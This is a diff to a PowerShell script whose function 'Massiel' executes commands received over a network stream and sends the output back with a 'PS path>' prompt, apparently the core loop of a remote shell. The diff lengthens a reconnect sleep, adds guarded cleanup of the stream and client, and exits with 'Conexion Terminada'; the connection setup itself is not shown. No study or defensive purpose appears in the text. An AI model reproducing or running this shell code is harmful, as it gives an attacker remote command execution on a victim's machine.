@@ -31,62 +31,72 @@ Function Massiel {
 
                     $Results = & $ScriptBlocks 2>&1 | Out-String
 
-                }
-                Catch {
+                 }
+                 Catch {
 
                     $Results = $_.Exception.Message
 
-                }
+                 }
 
-                if([String]::IsNullOrWhiteSpace($Results)){
+                 if([String]::IsNullOrWhiteSpace($Results)){
 
                     $Results = "[OK]"
 
+                 }
+
+                 $Sends = $Results + "`r`nPS " + (pwd).Path + "> "
+
+                 $SendData = [System.Text.Encoding]::UTF8.GetBytes($Sends)
+
+                 $Streams.Write($SendData,0,$SendData.Length)
+
+                 $Streams.Flush()
+
+                 }
+
+                  }
+                 Catch {
+
+                 Start-Sleep -Seconds 30
+
+                  try {
+                   if ($Streams) {
+                       $Streams.Close()
+                       $Streams.Dispose()
+                        }
+                      }
+                     catch {}
+
+                        try {
+                       if ($Clients) {
+                           $Clients.Close()
+                           $Clients.Dispose()
+                               }
+                                 }
+                                  catch {}
+
+                                  Write-Host "Conexion Terminada"
+
+                                        [Environment]::Exit(0)
+
+                                       }
+                                 Finally {
+
+             try {
+             if ($Streams) {
+                 $Streams.Close()
+                 $Streams.Dispose()
                 }
+              }
+             catch {}
 
-                $Sends = $Results + "`r`nPS " + (pwd).Path + "> "
-
-                $SendData = [System.Text.Encoding]::UTF8.GetBytes($Sends)
-
-                $Streams.Write($SendData,0,$SendData.Length)
-
-                $Streams.Flush()
-
-            }
-
+             try {
+             if ($Clients) {
+                $Clients.Close()
+                $Clients.Dispose()
+             }
+          }
+          catch {}
         }
-        Catch {
-
-            Start-Sleep -Seconds 9
-
-                    $Streams.Close()
-                    $Streams.Dispose()
-                    $Clients.Close()
-                    $Clients.Dispose()
-
-            Write-Host "Conexion Terminate"
-
-        }
-        Finally {
-
-            if ($Streams) {
-                try {
-                    $Streams.Close()
-                    $Streams.Dispose()
-                }
-                catch {}
-            }
-
-            if ($Clients) {
-                try {
-                    $Clients.Close()
-                    $Clients.Dispose()
-                }
-                catch {}
-            }
-
-        }
-
     }
-
 Massiel
